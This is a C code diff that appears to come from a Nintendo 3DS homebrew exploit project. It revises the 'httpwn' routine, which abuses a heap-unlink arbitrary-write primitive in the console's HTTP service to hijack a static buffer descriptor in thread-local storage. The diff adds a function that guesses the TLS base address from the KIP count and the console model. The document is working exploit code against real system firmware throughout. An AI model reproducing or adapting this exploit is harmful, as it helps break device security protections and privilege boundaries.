@@ -5,6 +5,7 @@
 
 #define MAGIC_USED_CHUNK        0x5544 // "UD" (used)
 #define MAGIC_FREE_CHUNK        0x4652 // "FR" (free)
+#define IS_N3DS                 (*(vu32 *)0x1FF80030 >= 6) // APPMEMTYPE. Hacky but doesn't use APT
 
 typedef struct HeapChunk {
     u16 magic;
@@ -77,6 +78,16 @@ static Result doHttpwnArbwrite(u32 a, u32 b, u32 holePa, Handle srvHandle, Handl
     return res;
 }
 
+static u32 guessTargetTlsBase(void)
+{
+    // 3.0 (?) (4.2 guaranteed)-latest
+    s64 numKips = 0;
+    svcGetSystemInfo(&numKips, 26, 0);
+
+    // Account a 0x2000 offset for non-rosalina, 0x1000 more for N3DS stuff
+    return 0x1FFA0000 + (numKips < 6 ? 0x2000 : 0) + (IS_N3DS ? 0x1000 : 0);
+}
+
 Result httpwn(Handle *outHandle, u32 *outSelfSbufId, u32 *outAlignedBuffer, void *linearWorkbuf, void *hole, Handle gspHandle)
 {
     // hole must be in the middle of a LINEAR heap block
@@ -103,14 +114,15 @@ Result httpwn(Handle *outHandle, u32 *outSelfSbufId, u32 *outAlignedBuffer, void
 
     // Primitive is: *(a + 12) = b; *(b + 8) = a;
     // Write the static buffer descriptor (using an unaligned write) and buffer address.
-    u32 targetTlsArea = 0x1FFA0000 + 0x180 + 0x20; // unused, not overwritten
+    *outSelfSbufId = 4;
+    u32 targetTlsBase = guessTargetTlsBase();
+    u32 targetTlsArea = targetTlsBase + 0x180 + 8 * *outSelfSbufId;
     TRY(doHttpwnArbwrite(targetTlsArea - 12, targetTlsArea + 2, holePa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf)); // perfectly valid sbuf descriptor btw
     TRY(doHttpwnArbwrite(targetTlsArea + 4 - 12, targetTlsArea, holePa, srvHandle, gspHandle, httpServerHandle, linearWorkbuf));
 
     // We now have static buffer #4 covering its descriptor (tls+0x180+0x20), sz=0x40
     *outHandle = httpServerHandle;
-    *outSelfSbufId = 4;
-    *outAlignedBuffer = 0x1FFA0000; // tls+0x00 is unused, AFAIK
+    *outAlignedBuffer = targetTlsArea & ~0xFFF; // tls+0x00 is unused, AFAIK
 
     // Let things leak, we don't really care
     return res;
